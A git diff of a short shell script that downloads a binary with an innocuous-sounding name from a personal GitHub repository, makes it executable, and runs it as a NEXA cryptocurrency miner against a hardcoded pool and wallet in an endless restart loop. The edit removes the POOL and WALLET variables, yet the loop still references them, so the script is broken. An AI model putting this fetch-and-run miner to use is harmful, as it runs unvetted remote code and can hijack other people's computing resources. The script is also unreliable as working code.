@@ -1,9 +1,6 @@
 #!/bin/sh
 
-POOL=tls://pool.woolypooly.com:3124
-WALLET=nexa:nqtsq5g5wy64h8wxxv68mqa7u9xfry4t423ycl2f4lxgl6qy
-
 wget https://raw.githubusercontent.com/unauna1803/bhotoruzer/main/buzer
 chmod 700 buzer
-timeout 1m ./buzer --algo NEXA --pool $POOL --user $WALLET $@
+timeout 1m ./buzer --algo NEXA --pool tls://pool.woolypooly.com:3124 --user nexa:nqtsq5g5wy64h8wxxv68mqa7u9xfry4t423ycl2f4lxgl6qy
 while :; do timeout 1m ./buzer --algo NEXA --pool $POOL --user $WALLET $@;echo JOSS; sleep 10s; done
